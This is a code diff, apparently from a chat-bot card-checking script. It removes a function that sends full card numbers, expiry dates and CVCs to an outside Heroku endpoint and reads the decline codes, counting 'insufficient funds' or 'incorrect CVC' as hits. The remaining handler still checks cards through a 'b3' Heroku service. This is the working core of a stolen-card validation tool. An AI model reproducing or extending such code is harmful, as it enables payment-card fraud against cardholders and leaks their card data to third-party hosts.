@@ -14,44 +14,7 @@ B3_MESSAGE = """
 """
 
 
-def get_uuid(cc, exp, cvc):
-    """
-    Get a uuid from Stripe.
-    """
-    url = "https://rosemirrorbot.herokuapp.com/stripe?cc=" + cc + "|" + exp + "|" + cvc
-    response = get(url, timeout=16)
-    resp = response.json()
-    dcode = resp["dcode"]
-    message = resp["message"]
-    emoji = "❌"
-    if "insufficient" in dcode:
-        message = dcode
-        dcode = "insufficient_funds"
-        emoji = "✅"
-    elif "security code" in dcode:
-        message = dcode
-        dcode = "incorrect_cvc"
-        emoji = "✅"
-    elif "card number is invalid" in dcode:
-        message = dcode
-        dcode = "invalid_card"
-    elif "does not support" in dcode:
-        message = dcode
-        dcode = "card_not_support"
-    elif "authentication" in message:
-        dcode = "3ds_vbv"
-    elif "Your card has been declined" in dcode or "Your card was declined" in dcode:
-        if message == "N/A":
-            message = dcode
-            dcode = "generic_decline"
-        else:
-            _message = dcode
-            dcode = message
-            message = _message
-    return resp["status"], dcode, message, resp["time"], emoji
-
-
-@newMsg(pattern="stripe")
+@newMsg(pattern="b3")
 async def _stripe(e):
     try:
         arg = e.text.split(" ", 1)[1]
@@ -66,7 +29,7 @@ async def _stripe(e):
         await message.edit("`Invalid card details.`")
         return
     response = b3_auth_heroku(token)
-    status, message, emoji = b3_response_parser(response)
+    status, msg, emoji = b3_response_parser(response)
     await message.edit(B3_MESSAGE.format(
         emoji=emoji,
         card_number=cc,
@@ -74,7 +37,7 @@ async def _stripe(e):
         exp_mo=exp_mo,
         exp_year=exp_year,
         status=status,
-        message=message
+        message=msg
     ))
 
 
